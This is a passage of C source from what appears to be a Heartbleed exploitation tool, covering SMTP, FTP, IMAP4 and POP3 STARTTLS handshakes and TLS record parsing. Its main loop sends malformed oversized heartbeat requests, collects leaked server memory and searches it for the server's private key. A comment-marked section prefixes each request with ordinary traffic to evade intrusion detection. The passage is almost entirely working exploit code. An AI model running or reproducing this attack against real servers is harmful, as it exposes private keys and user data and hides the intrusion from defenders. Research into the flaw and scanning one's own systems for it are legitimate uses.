        }

        /* grab the next character */
        len = recv(fd, &c, 1, 0);
        if (len == 0) {
            if (start_time + timeout < time(0)) {
                ERROR_MSG("[-] starttls handshake: network error\n");
                return -1;
            }
        }

        /* append to the line */
        if (*offset < max) {
            line[(*offset)++] = c;
        }

        /* quit at end of line */
        if (c == '\n')
            break;
    }

    return 0;
}

/******************************************************************************
 ******************************************************************************/
static int
starttls_smtp(int fd,
                const struct DumpArgs *args, const struct Target *target)
{
    unsigned char line[2048];
    unsigned offset;
    int x;


    /* grab the helo line */
    for (;;) {
        offset = 0;
        x = recv_line(fd, line, &offset, sizeof(line), args->timeout);
        if (x < 0)
            return x;
        DEBUG_MSG("[+] %.*s", offset, line);
        if (offset < 4 || memcmp(line, "220", 3) == 3) {
            ERROR_MSG("[-] starttls handshake: unexpected data\n");
            return -1;
        }
        if (line[3] != '-')
            break;
    }

    /* send greetings */
    if (send(fd, "EHLO server\r\n", 13, 0) != 13) {
        ERROR_MSG("[-] starttls handshake: network error\n");
        return -1;
    }

    /* grab their response */
    for (;;) {
        offset = 0;
        x = recv_line(fd, line, &offset, sizeof(line), args->timeout);
        if (x < 0)
            return x;
        DEBUG_MSG("[+] %.*s", offset, line);
        if (offset < 4 || memcmp(line, "250", 3) == 3) {
            ERROR_MSG("[-] starttls handshake: unexpected data\n");
            return -1;
        }
        if (line[3] != '-')
            break;
    }


    /* send STARTTLS */
    if (send(fd, "STARTTLS\r\n", 10, MSG_NOSIGNAL) != 10) {
        ERROR_MSG("[-] starttls handshake: network error\n");
        return -1;
    }

    /* see if it succeeded */
    offset = 0;
    for (;;) {
        x = recv_line(fd, line, &offset, sizeof(line), args->timeout);
        if (x < 0)
            return x;
        DEBUG_MSG("[+] %.*s", offset, line);
        if (offset < 4 || memcmp(line, "220", 3) == 3) {
            ERROR_MSG("[-] starttls handshake: unexpected data\n");
            return -1;
        }
        if (line[3] != '-')
            break;
    }

    DEBUG_MSG("[+] SMTP STARTTLS engaged\n");
    return 0;
}

/******************************************************************************
 ******************************************************************************/
static int
starttls_ftp(int fd,
                const struct DumpArgs *args, const struct Target *target)
{
    unsigned char line[2048];
    unsigned offset;
    int x;


    /* grab the helo line */
    for (;;) {
        offset = 0;
        x = recv_line(fd, line, &offset, sizeof(line), args->timeout);
        if (x < 0)
            return x;
        DEBUG_MSG("[+] %.*s", offset, line);
        if (line[0] != '2') {
            ERROR_MSG("[-] starttls handshake: unexpected data\n");
            return -1;
        }
        if (line[3] != '-')
            break;
    }

    /* send starttls */
    if (send(fd, "AUTH TLS\r\n", 10, MSG_NOSIGNAL) != 10) {
        ERROR_MSG("[-] starttls handshake: network error\n");
        return -1;
    }

    /* grab their response */
    for (;;) {
        offset = 0;
        x = recv_line(fd, line, &offset, sizeof(line), args->timeout);
        if (x < 0)
            return x;
        DEBUG_MSG("[+] %.*s", offset, line);
        if (line[0] != '2') {
            ERROR_MSG("[-] starttls handshake: unexpected data\n");
            return -1;
        }
        if (line[3] != '-')
            break;
    }

    DEBUG_MSG("[+] SMTP STARTTLS engaged\n");
    return 0;
}

/******************************************************************************
 ******************************************************************************/
static int
contains(const unsigned char line[], size_t length, const char substring[])
{
    size_t i;
    size_t substring_length = strlen(substring);

    if (substring_length > length)
        return 0;

    for (i = 0; i < length - substring_length; i++) {
        if (line[i] == substring[0])
            if (memcmp(line+i, substring, substring_length) == 0)
                return 1;
    }

    return 0;
}


/******************************************************************************
 ******************************************************************************/
static int
starttls_imap4(int fd,
                const struct DumpArgs *args, const struct Target *target)
{
    unsigned char line[2048];
    unsigned offset;
    int x;


    /* grab the helo line */
    offset = 0;
    x = recv_line(fd, line, &offset, sizeof(line), args->timeout);
    if (x < 0)
        return x;
    DEBUG_MSG("[+] %.*s", offset, line);


    /* send greetings */
    if (send(fd, "efgh STARTTLS\r\n", 15, MSG_NOSIGNAL) != 15) {
        ERROR_MSG("[-] starttls handshake: network error\n");
        return -1;
    }


    /* grab their response */
    offset = 0;
    x = recv_line(fd, line, &offset, sizeof(line), args->timeout);
    if (x < 0)
        return x;
    DEBUG_MSG("[+] %.*s", offset, line);
    if (!contains(line, offset, " OK ")) {
        ERROR_MSG("[-] starttls handshake: unexpected data\n");
        return -1;
    }


    DEBUG_MSG("[+] IMAP4 STARTTLS engaged\n");
    return 0;
}


/******************************************************************************
 ******************************************************************************/
static int
starttls_pop3(int fd,
                const struct DumpArgs *args, const struct Target *target)
{
    unsigned char line[2048];
    unsigned offset;
    int x;


    /* grab the helo line */
    offset = 0;
    x = recv_line(fd, line, &offset, sizeof(line), args->timeout);
    if (x < 0)
        return x;
    DEBUG_MSG("[+] %.*s", offset, line);
    if (offset < 4 || memcmp(line, "+OK ", 4) != 0) {
        ERROR_MSG("[-] starttls handshake: unexpected data\n");
    }


    /* send greetings */
    if (send(fd, "STLS\r\n", 6, MSG_NOSIGNAL) != 6) {
        ERROR_MSG("[-] starttls handshake: network error\n");
        return -1;
    }


    /* grab their response */
    offset = 0;
    x = recv_line(fd, line, &offset, sizeof(line), args->timeout);
    if (x < 0)
        return x;
    DEBUG_MSG("[+] %.*s", offset, line);
    if (offset < 4 || memcmp(line, "+OK ", 4) != 0) {
        ERROR_MSG("[-] starttls handshake: unexpected data\n");
        return -1;
    }


    DEBUG_MSG("[+] POP STARTTLS engaged\n");
    return 0;
}

/******************************************************************************
 ******************************************************************************/
struct SSL_RECORD {
    unsigned short remaining;
    unsigned char state;
    unsigned char type;
    struct {
        unsigned short remaining;
        unsigned char state;
        unsigned is_heartbleed_received:1;
    } heartbleed;
};

/******************************************************************************
 ******************************************************************************/
static int
raw_parse_heartbeat(struct SSL_RECORD *rec, const unsigned char *buf, size_t buf_size,
    struct Connection *connection)
{
    size_t i;
    enum {TAG, LEN0, LEN1, CONTENT, END};

    for (i=0; i<buf_size; i++) {
        switch (rec->heartbleed.state) {
        case TAG:
            if (buf[i] != 2) {
                DEBUG_MSG("[-] unknown heartbleedtype\n");
                rec->heartbleed.state = END;
            } else {
                rec->heartbleed.state++;
            }
            break;
        case LEN0:
            rec->heartbleed.remaining = buf[i]<<8;
            rec->heartbleed.state++;
            break;
        case LEN1:
            rec->heartbleed.remaining |= buf[i];
            rec->heartbleed.state++;
            break;
        case CONTENT:
            //DEBUG_MSG("[*] 0x%0x bytes remaining\n", rec->heartbleed.remaining);
            {
                size_t frag_len = buf_size - i;
                if (frag_len > rec->heartbleed.remaining)
                    frag_len = rec->heartbleed.remaining;

                connection_buf_append(connection, buf+i, frag_len);

                rec->heartbleed.remaining -= frag_len;
                i += frag_len - 1;

                //DEBUG_MSG("[+] 0x%0x bytes remaining\n", rec->heartbleed.remaining);
                if (rec->heartbleed.remaining <= 199)
                    rec->heartbleed.is_heartbleed_received = 1;
                if (rec->heartbleed.remaining == 0) {
                    rec->heartbleed.state = END;
                }
            }
            break;
        case END:
            i = buf_size;
            break;
        }
    }
    return 0;
}

/******************************************************************************
 ******************************************************************************/
static int
raw_parse_ssl(struct SSL_RECORD *rec, const unsigned char *buf, size_t *offset, size_t buf_size,
    struct Connection *connection)
{
    size_t i;
    enum {TAG, VER_MAJOR, VER_MINOR, LEN0, LEN1, CONTENT, END};

    for (i=*offset; i<buf_size; i++) {
        switch (rec->state) {
        case TAG:
            if (buf[i] < 20 || 25 < buf[i]) {
                DEBUG_MSG("[-] unknown SSL record type\n");
                return -1;
            }
            rec->type = buf[i];
            rec->state++;
            break;
        case VER_MAJOR:
            if (buf[i] != 3) {
                DEBUG_MSG("[-] unknown SSL version\n");
                return -1;
            }
            rec->state++;
            break;
        case VER_MINOR:
            if (3 < buf[i]) {
                DEBUG_MSG("[-] unknown SSL minor version\n");
                return -1;
            }
            rec->state++;
            break;
        case LEN0:
            rec->remaining = buf[i]<<8;
            rec->state++;
            break;
        case LEN1:
            rec->remaining |= buf[i];
            rec->state++;
            DEBUG_MSG("[+] type=0x%0x len=0x%0x\n", rec->type, rec->remaining);
            break;
        case CONTENT:
            {
                size_t frag_len = buf_size - i;
                if (frag_len > rec->remaining)
                    frag_len = rec->remaining;

                switch (rec->type) {
                case 24:
                    raw_parse_heartbeat(rec, buf+i, frag_len, connection);
                    break;
                default:
                    break;
                }

                rec->remaining -= frag_len;
                i += frag_len - 1;

                if (rec->remaining == 0) {
                    rec->state = 0;
                    *offset = i + 1;
                    return 0;
                }
            }
            break;
        default:
            i = buf_size;
            break;
        }
    }

    *offset = i;
    return 0;
}


/******************************************************************************
 * Do the raw TCP connection, before the handshake has completed
 ******************************************************************************/
static int
ssl_thread_raw(int fd, const struct DumpArgs *args, struct Target *target,
                struct Connection *connection)
{
    static const char client_hello[] = 
        "\x16\x03\x01\x02\x00\x01\x00\x01\xfc\x03\x03\x92\x2b\xa1\xe5\x46"
        "\x09\x59\x03\xcc\xf2\x6a\xd7\x4c\xc8\xb9\xd3\x72\x35\xcb\xf6\x0b"
        "\x92\xe3\xcd\x30\x6c\x9a\x67\x84\x49\x00\x82\x00\x00\xa0\xc0\x30"
        "\xc0\x2c\xc0\x28\xc0\x24\xc0\x14\xc0\x0a\xc0\x22\xc0\x21\x00\xa3"
        "\x00\x9f\x00\x6b\x00\x6a\x00\x39\x00\x38\x00\x88\x00\x87\xc0\x32"
        "\xc0\x2e\xc0\x2a\xc0\x26\xc0\x0f\xc0\x05\x00\x9d\x00\x3d\x00\x35"
        "\x00\x84\xc0\x12\xc0\x08\xc0\x1c\xc0\x1b\x00\x16\x00\x13\xc0\x0d"
        "\xc0\x03\x00\x0a\xc0\x2f\xc0\x2b\xc0\x27\xc0\x23\xc0\x13\xc0\x09"
        "\xc0\x1f\xc0\x1e\x00\xa2\x00\x9e\x00\x67\x00\x40\x00\x33\x00\x32"
        "\x00\x9a\x00\x99\x00\x45\x00\x44\xc0\x31\xc0\x2d\xc0\x29\xc0\x25"
        "\xc0\x0e\xc0\x04\x00\x9c\x00\x3c\x00\x2f\x00\x96\x00\x41\x00\x07"
        "\xc0\x11\xc0\x07\xc0\x0c\xc0\x02\x00\x05\x00\x04\x00\x15\x00\x12"
        "\x00\x09\x00\x14\x00\x11\x00\x08\x00\x06\x00\x03\x00\xff\x01\x00"
        "\x01\x33\x00\x0b\x00\x04\x03\x00\x01\x02\x00\x0a\x00\x34\x00\x32"
        "\x00\x0e\x00\x0d\x00\x19\x00\x0b\x00\x0c\x00\x18\x00\x09\x00\x0a"
        "\x00\x16\x00\x17\x00\x08\x00\x06\x00\x07\x00\x14\x00\x15\x00\x04"
        "\x00\x05\x00\x12\x00\x13\x00\x01\x00\x02\x00\x03\x00\x0f\x00\x10"
        "\x00\x11\x00\x23\x00\x00\x00\x0d\x00\x20\x00\x1e\x06\x01\x06\x02"
        "\x06\x03\x05\x01\x05\x02\x05\x03\x04\x01\x04\x02\x04\x03\x03\x01"
        "\x03\x02\x03\x03\x02\x01\x02\x02\x02\x03\x00\x0f\x00\x01\x01\x00"
        "\x15\x00\xc2\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
        "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
        "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
        "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
        "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
        "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
        "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
        "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
        "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
        "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
        "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
        "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
        "\x00\x00\x00\x00\x00";
    int x;
    time_t start_time;
    unsigned char buf[16384];
    size_t buf_size;
    size_t offset;
    struct SSL_RECORD rec;
    unsigned is_fail = 0;

    memset(&rec, 0, sizeof(rec));

    /*
     * Send the client hello
     */
    x = send(fd, client_hello, sizeof(client_hello)-1, MSG_NOSIGNAL);
    if (x < 3) {
        ERROR_MSG("[-] raw handshake: %s (%u)\n",
            error_msg(WSAGetLastError()), WSAGetLastError());
        return -1;
    }

    /*
     * Wait for the server response
     */
    for (;;) {
        start_time = time(0);
        while (!is_incoming_data(fd)) {
            if (start_time + args->timeout < time(0)) {
                ERROR_MSG("[-] raw handshake: timed out\n");
                return -1;
            }
        }
        buf_size = recv(fd, (char*)buf, sizeof(buf), 0);
        if (buf_size == 0) {
            ERROR_MSG("[-] raw handshake: %s (%u)\n",
                error_msg(WSAGetLastError()), WSAGetLastError());
            return -1;
        }

        /*
         * Parse the response
         */
        offset = 0;
        x = raw_parse_ssl(&rec, buf, &offset, buf_size, connection);
        if (x == -1) {
            ERROR_MSG("[-] raw handshake: parse error\n");
            return -1;
        }
        if (rec.state == 0)
            break;
    }


    /*
     * Send heartbeat request
     */
    rec.heartbleed.state = 0;
//resend:
    x = send(fd, "\x18\x03\x01\x00\x03"
                 "\x01\x40\x00", 8, MSG_NOSIGNAL);
    if (x < 3) {
        ERROR_MSG("[-] raw handshake: %s (%u)\n",
            error_msg(WSAGetLastError()), WSAGetLastError());
        return -1;
    }
    rec.heartbleed.is_heartbleed_received = 0;

    print_status(args);

    /*
     * Parse remaining data
     */
    while (!rec.heartbleed.is_heartbleed_received) {
        if (offset >= buf_size) {
            start_time = time(0);
            while (!is_incoming_data(fd)) {
                if (start_time + args->timeout < time(0)) {
                    ERROR_MSG("[-] raw handshake: timed out\n");
                    goto fail;
                }
            }
            buf_size = recv(fd, (char*)buf, sizeof(buf), 0);
            if (buf_size == 0) {
                ERROR_MSG("[-] raw handshake: %s (%u)\n",
                    error_msg(WSAGetLastError()), WSAGetLastError());
                goto fail;
            }
            offset = 0;
        }

        /*
         * Parse the response
         */
        while (offset < buf_size) {
            x = raw_parse_ssl(&rec, buf, &offset, buf_size, connection);
            if (x == -1) {
                ERROR_MSG("[-] raw handshake: parse error\n");
                return -1;
            }
        }
    }

    goto end;

fail:
    is_fail = 1;
end:
    if (connection->buf2_count) {
        DEBUG_MSG("[+] received %u bytes of heartbleed\n", connection->buf2_count);
        process_bleed(args, connection->buf2, connection->buf2_count,
                        target->n, target->e);
        connection_buf_init(connection);
    }

    //if (!is_fail)
     //   goto resend;

    return 0;
}



/******************************************************************************
 * This is the main threat that creates a TCP connection, negotiates
 * SSL, and then starts sending queries at the server.
 ******************************************************************************/
static int
ssl_thread(const struct DumpArgs *args, struct Target *target)
{
    int x;
    struct addrinfo *addr;
    ptrdiff_t fd;
    SSL_CTX* ctx = 0;
    SSL* ssl = 0;
    BIO* rbio = 0;
    BIO* wbio = 0;
    size_t len;
    char buf[16384];
    char address[64];
    size_t total_bytes = 0;
    char port[6];
    time_t started;
    struct Connection connection[1];
    const char *hostname;

    memset(connection, 0, sizeof(connection[0]));
    connection->args = args;
    connection->target = target;

    /*
     * If we are doing a proxy, then switch the target hostname
     * to that of the proxy
     */
    if (args->proxy.host) {
        hostname = args->proxy.host;
        snprintf(port, sizeof(port), "%u", args->proxy.port);
    } else {
        hostname = target->hostname;
        snprintf(port, sizeof(port), "%u", target->port);
    }



    /*
     * Do the DNS lookup. A hostname may have multiple IP addresses, so we
     * print them all for debugging purposes. Normally, we'll just pick
     * the first address to use, but we allow the user to optionally
     * select the first IPv4 or IPv6 address with the -v option.
     */
    DEBUG_MSG("\n[ ] resolving \"%s\"\n", hostname);
    x =  getaddrinfo(hostname, port, 0, &addr);
    if (x != 0) {
        target->scan_result = Verdict_Inconclusive_NoDNS;
        return ERROR_MSG("[-] %s: DNS lookup failed\n", hostname);
    } else if (is_debug) {
        struct addrinfo *a;
        for (a=addr; a; a = a->ai_next) {
            my_inet_ntop(a->ai_addr, address, sizeof(address));
            DEBUG_MSG("[+]  %s\n", address);
        }
    }
    while (addr && args->ip_ver == 4 && addr->ai_family != AF_INET)
        addr = addr->ai_next;
    while (addr && args->ip_ver == 6 && addr->ai_family != AF_INET6)
        addr = addr->ai_next;
    if (addr == NULL)
        return ERROR_MSG("IPv%u address not found\n", args->ip_ver);
    my_inet_ntop(addr->ai_addr, address, sizeof(address));



    /*
     * Create a normal TCP socket
     */
    fd = socket(addr->ai_family, SOCK_STREAM, 0);
    if (fd < 0)
        return ERROR_MSG("%u: could not create socket\n", addr->ai_family);
#if defined(SO_NOSIGPIPE)
    {
        int set = 1;
        setsockopt(fd, SOL_SOCKET, SO_NOSIGPIPE, (void *)&set, sizeof(int));
    }
#endif

    /*
     * Do a normal TCP connect to the target IP address, sending a SYN and
     * so on
     */
    DEBUG_MSG("[ ] %s: connecting...\n", address);
    x = connect(fd, addr->ai_addr, (int)addr->ai_addrlen);
    if (x != 0) {
        target->scan_result = Verdict_Inconclusive_NoTcp;
        ERROR_MSG("[-] %s: connect failed: %s (%u)\n",
            address, error_msg(WSAGetLastError()), WSAGetLastError());
        if (target->loop.done == 0)
            target->loop.desired = 0;
        sleep(1);
        return 0;
    }
    DEBUG_MSG("[+] %s: connected\n", address);


    /*
     * If doing a proxy, then do the SOCKS5N connect stuff
     */
    if (args->proxy.host) {
        if (proxy_handshake(fd, args, target) == -1) {
            ERROR_MSG("[-] proxy handshake failed\n");
            if (target->loop.done == 0)
                target->loop.desired = 0;
            goto end;
        }
    }


    /*
     * If doing STARTTLS, do the negotiation now.
     */
    switch (target->starttls) {
    case APP_NONE:
        break;
    case APP_SMTP:
        if (starttls_smtp(fd, args, target) == -1) {
            ERROR_MSG("[-] starttls handshake failed\n");
            if (target->loop.done == 0)
                target->loop.desired = 0;
            goto end;
        }
        break;
    case APP_IMAP4:
        if (starttls_imap4(fd, args, target) == -1) {
            ERROR_MSG("[-] starttls handshake failed\n");
            if (target->loop.done == 0)
                target->loop.desired = 0;
            goto end;
        }
        break;
    case APP_POP3:
        if (starttls_pop3(fd, args, target) == -1) {
            ERROR_MSG("[-] starttls handshake failed\n");
            if (target->loop.done == 0)
                target->loop.desired = 0;
            goto end;
        }
        break;
    case APP_FTP:
        if (starttls_ftp(fd, args, target) == -1) {
            ERROR_MSG("[-] starttls handshake failed\n");
            if (target->loop.done == 0)
                target->loop.desired = 0;
            goto end;
        }
        break;
    default:
        ERROR_MSG("[-] starttls handshake: unknown\n");
        if (target->loop.done == 0)
            target->loop.desired = 0;
        goto end;
    }

    /*
     * If doing mid-handshake heartbeats, then switch to that
     */
    if (args->is_raw > 1) {
        ssl_thread_raw(fd, args, target, connection);
        goto end;
    }

    /*
     * Initialize SSL structures. Specifically, we initialize them with
     * "memory" BIO instead of normal "socket" BIO, because we are handling
     * the socket communications ourselves, and are just using BIO to
     * encrypt outgoing buffers and decrypt incoming buffers.
     */
    ctx = SSL_CTX_new(SSLv23_client_method());
    SSL_CTX_set_verify(ctx, SSL_VERIFY_NONE, NULL);
    ssl = SSL_new(ctx);
    rbio = BIO_new(BIO_s_mem());
    wbio = BIO_new(BIO_s_mem());
    SSL_set_bio(ssl, rbio, wbio);
    SSL_set_connect_state(ssl);
    SSL_set_msg_callback(ssl, receive_heartbeat);
    SSL_set_msg_callback_arg(ssl, (void*)&connection);
    connection->is_alert = 0;


    /*
     * SSL handshake (rerouting the encryptions). This is an ASYNCHROUNOUS
     * technique using our own sockets and "memory BIO". It's not the normal
     * use of the API that you'd expect. We have to do do the send()/recv()
     * ourselves on sockets, then pass then through to the SSL layer
     */
    DEBUG_MSG("[ ] SSL handshake started...\n");
    target->scan_result = Verdict_Inconclusive_NoSsl;
    started = time(0);
    for (;;) {

        /* If we can't finish the SSL handshake in 6 seconds, we probably
         * never will */
        if (started + args->timeout < time(0)) {
            ERROR_MSG("[-] timeout waiting for SSL handshake\n");
            if (target->loop.done <= 1)
                target->loop.desired = 0;
            goto end;
        }

        /* If SSL stack wants to send something, then send it out the
         * TCP/IP stack */
        len = BIO_pending(wbio);
        if (len) {
            if (len > sizeof(buf))
                len = sizeof(buf);
            BIO_read(wbio, buf, (int)len);
            x = send(fd, buf, (int)len, MSG_NOSIGNAL);
            if (x <= 0) {
                unsigned err = WSAGetLastError();
                ERROR_MSG("[-] %s:%s send fail: %s (%u)\n",
                          address, port, error_msg(err), err);
                goto end;
            }
        }

        /* If the TCP/IP has received something, then pump the forward
         * the network data to the SSL stack */
        x = SSL_connect(ssl);
        if (x >= 0)
            break; /* success! */
        if (x == -1 && SSL_get_error(ssl, x) == SSL_ERROR_WANT_READ) {
            char buf[16384];

            if (is_incoming_data(fd)) {
                x = recv(fd, buf, sizeof(buf), 0);
                if (x > 0) {
                    BIO_write(rbio, buf, x);
                } else {
                    unsigned err = WSAGetLastError();
                    if (target->loop.done <= 1) {
                        ERROR_MSG("[-] %s (%u)\n", error_msg(err), err);
                        target->loop.desired = 0;
                        goto end;
                    } else {
                        DEBUG_MSG("[-] %s (%u)\n", error_msg(err), err);
                        break;
                    }
                }
            }
        } else {
            ERROR_MSG("[-] %s:%s: SSL handshake failed: %d\n",
                                     address, port, SSL_get_error(ssl, 0));
            if (target->loop.done <= 1)
                target->loop.desired = 0;
            goto end;
        }
    }
    DEBUG_MSG("[+] SSL handshake complete [%s]\n", SSL_get_cipher(ssl));


    /*
     * Get the peer certificate from the handshake. We do this so that we
     * can automatically scan the heartbleed information for private key
     * information
     */
    {
        X509 *cert;
        char name[512];

        cert = SSL_get_peer_certificate(ssl);
        if (cert) {
            parse_cert(cert, name, &target->n, &target->e);
            X509_free(cert);
        }
    }

    /*
     * If heartbeats are disabled, then early exit
     */
    if (ssl->tlsext_heartbeat != 1) {
        ERROR_MSG("[-] target doesn't support heartbeats\n");
        connection->heartbleeds.failed++;
    }

    if (args->is_raw)
        ((struct DumpArgs*)args)->is_raw++;
    

    /*
     * Loop many times
     */
again:
    if (connection->heartbleeds.failed) {
        target->scan_result = Verdict_Safe;
        target->loop.desired = 0;
        goto end;
    }
    if (connection->heartbleeds.succeeded && args->is_scan) {
        target->scan_result = Verdict_Vulnerable;
        target->loop.desired = 0;
        goto end;
    }
    if (target->loop.done++ >= target->loop.desired) {
        DEBUG_MSG("[-] loop-count = 0\n");
        goto end;
    }


    /*
     * Print how many bytes we've downloaded on command-line every
     * second (to <stderr>)
     */
    print_status(args);

    /*
     * If we have a buffer, flush it to the file. This may also scan the buffer
     * for private keys and other useful information
     */
    if (connection->buf2_count) {
        process_bleed(args, connection->buf2, connection->buf2_count,
                      target->n, target->e);
        connection_buf_init(connection);
    }

    /*
     * [IDS-EVASION]
     *  In order to evade detection, we prefix the heartbeat request with
     *  some other data. This can either be an "Alert/Warning" at the SSL
     *  layer, or it could be a an application layer request, such as an
     *  HTTP GET or SMTP NOOP command.
     */
    switch (target->application) {
    case APP_HTTP:
        ssl3_write_bytes(ssl,
                         SSL3_RT_APPLICATION_DATA,
                         target->http_request,
                         (int)strlen(target->http_request)-10);
        break;
    case APP_SMTP:
        ssl3_write_bytes(ssl,
                         SSL3_RT_APPLICATION_DATA,
                         "NOOP\r\n",
                         6);
        break;
    case APP_POP3:
        ssl3_write_bytes(ssl,
                         SSL3_RT_APPLICATION_DATA,
                         "STAT\r\n",
                         6);
        break;
    case APP_IMAP4:
        ssl3_write_bytes(ssl,
                         SSL3_RT_APPLICATION_DATA,
                         "a001 CAPABILITY\r\n",
                         17);
        break;
    default:
        /*ssl3_write_bytes(ssl,
                         SSL3_RT_ALERT,
                         "\x15\x03\x02\x00\x02\x01\x2e",
                         7);*/
        break;
    }

    /*
     * [HEARTBEAT]
     *  Here is where we send the heartbeat request. This is normally a
     *  "bleed" request, but if we haven't gotten any bleed responses, we'll
     *  instead send a "beat" request. A system that responses to beats but
     *  not bleeds is almost certainly patched.
     */
    if (connection->heartbleeds.attempted > 1
        && connection->heartbleeds.succeeded == 0) {
        /* we've sent a heartbleeds with no response, therefore try a
         * normal heartbeat */
        connection->is_sent_good_heartbeat = 1;
        ssl3_write_bytes(ssl, TLS1_RT_HEARTBEAT,
            "\x01\x00\x12"
            "aaaaaaaaaaaaaaaa"
            "aaaaaaaaaaaaaaaa"
            "aaaaaaaaaaaaaaaa"
            "aaaaaaaaaaaaaaaa",
            67);
        connection->event.bytes_expecting = 37;
        connection->event.bytes_received = 0;
        DEBUG_MSG("[ ] probing with good heartbeat\n");
    } else if (args->is_rand_size) {
        /* If configured to do so, do random sizes */
        unsigned size = rand();
        char rbuf[] = "\x01\x00\x30"
        "aaaaaaaaaaaaaaaa"
        "aaaaaaaaaaaaaaaa"
        "aaaaaaaaaaaaaaaa"
        "aaaaaaaaaaaaaaaa";
        if (size <= 128)
            size = 128;
        rbuf[0] = 1;
        rbuf[1] = (char)(size>>8);
        rbuf[2] = (char)(size>>0);
        ssl3_write_bytes(ssl, TLS1_RT_HEARTBEAT, rbuf, 37);
        connection->heartbleeds.attempted++;
        connection->event.bytes_expecting = size;
        connection->event.bytes_received = 0;
    } else {
        static const char rbuf[] = "\x01\xff\xff"
        "aaaaaaaaaaaaaaaa"
        "aaaaaaaaaaaaaaaa"
        "aaaaaaaaaaaaaaaa"
        "aaaaaaaaaaaaaaaa";
        /* NORMALLY, just send a short heartbeat request */
        ssl3_write_bytes(ssl, TLS1_RT_HEARTBEAT, rbuf, 37);
        connection->heartbleeds.attempted++;
        connection->event.bytes_expecting = 0xFFFF + 3 + 16;
        connection->event.bytes_received = 0;
    }



    /*
     * Transmit both requests (data and heartbeat) in the same packet
     */
    DEBUG_MSG("[ ] transmitting requests\n");
    while ((len = BIO_pending(wbio)) != 0) {
        if (len > sizeof(buf))
            len = sizeof(buf);
        BIO_read(wbio, buf, (int)len);
        x = send(fd, buf, (int)len, MSG_NOSIGNAL);
        if (x <= 0) {
            unsigned err = WSAGetLastError();
            ERROR_MSG("[-] %s:%s send fail: %s (%u)\n",
                      address, port, error_msg(err), err);
            goto end;
        }
    }

    /*
     * Wait for the response. We are actually just waiting for the normal
     * HTTP-layer response, but during the wait, callbacks to the
     * "receive_heartbeat" function will happen.
     */
    DEBUG_MSG("[ ] waiting for response\n");
    started = time(0);
    while (connection->event.bytes_received 
                                        < connection->event.bytes_expecting) {
        char buf[65536];

        /* if we can an ALERT at the SSL layer, break out of this loop */
        if (connection->is_alert)
            goto end;

        /* only wait a few seconds for a response */
        if (started + args->timeout < time(0)) {
            DEBUG_MSG("[-] timeout waiting for response\n");
            break;
        }

        /* Use 'select' to poll to see if there is data waiting for us
         * from the network */
        if (is_incoming_data(fd)) {
            x = recv(fd, buf, sizeof(buf), 0);
            if (x > 0) {
                total_bytes += x;
                BIO_write(rbio, buf, x);
            } else {
                unsigned err = WSAGetLastError();
                DEBUG_MSG("[-] receive error: %s (%u)\n", error_msg(err), err);
                if (connection->heartbleeds.succeeded == 0 
                    && target->loop.done <= 2) {
                    target->application = 0;
                }
                goto end;
            }
        }

        /*
         * Use the SSL function to decrypt the data that was put into the
         * BIO memory buffers above in the sockets.recv()/BIO_write()
         * combination.
         */
        x = SSL_read(ssl, buf, sizeof(buf));
        if (x < 0 || SSL_get_error(ssl, x) == SSL_ERROR_WANT_READ)
            ;
        else if (x < 0) {
            x = SSL_get_error(ssl, x);

            ERROR_MSG("[-] SSL error received\n");
            ERR_print_errors_fp(stderr);
            break;
        } else if (x > 0) {
            DEBUG_MSG("[+] %d-bytes data received\n", x);
            if (is_debug)
            if (memcmp(buf, "HTTP/1.", 7) == 0 && strchr(buf, '\n')) {
                size_t i;
                fprintf(stderr, "[+] ");
                for (i=0; i<(size_t)x && buf[i] != '\n'; i++) {
                    if (buf[i] == '\r')
                        continue;
                    if (isprint(buf[i]&0xFF))
                        fprintf(stderr, "%c", buf[i]&0xFF);
                    else
                        fprintf(stderr, ".");
                }
                fprintf(stderr, "\n");
            }
        }
    }
    goto again;

    /*
     * We've either reached our loop limit or the other side closed the
     * connection
     */
    DEBUG_MSG("[+] connection terminated\n");
end:
    process_bleed(args, connection->buf2, connection->buf2_count,
                  target->n, target->e);
    connection_buf_init(connection);
    SSL_free(ssl);
    SSL_CTX_free(ctx);
    closesocket(fd);
    return 0;
}


/******************************************************************************
 ******************************************************************************/
static void
scan_patterns(const struct DumpArgs *args, 
              const unsigned char *buf, size_t buf_size)
{
    size_t i;

    for (i=0; i<args->patterns.count; i++) {
        int x;
        int j;
        int ovector[1024*3];

        x = PCRE.exec(args->patterns.pat[i],
                        args->patterns.extra[i],
                        (char*)buf, buf_size, 0, 0,
                        ovector, 1024*3);
        for (j=0; j<x; j++) {
            int k;
            for (k=ovector[i*j]; k<ovector[i*j+1]; k++) {
                if (isprint(buf[k]))
                    printf("%c", buf[k]);
                else
                    printf(".");
            }
            printf("\n");
        }
    }
}


/******************************************************************************
 * Process the files produced by this tool, or other tools, looking for
 * the private key in the given certificate.
 ******************************************************************************/
static void
process_offline_file(const struct DumpArgs *args,
                        const char *filename_cert, const char *filename_bin)
{
    FILE *fp;
    X509 *cert;
    char name[512];
    BIGNUM n;
    BIGNUM e;
    unsigned long long offset = 0;
    unsigned long long last_offset = 0;

    /*
     * Read in certificate
     */
    if (filename_cert) {
        fp = fopen(filename_cert, "rb");
        if (fp == NULL) {
            perror(filename_cert);
            return;
        }
        cert = PEM_read_X509(fp, NULL, NULL, NULL);
        if (cert == NULL) {
            fprintf(stderr, "%s: error parsing certificate\n", filename_cert);
            fclose(fp);
            return;
        }
        fclose(fp);
        parse_cert(cert, name, &n, &e);
    }

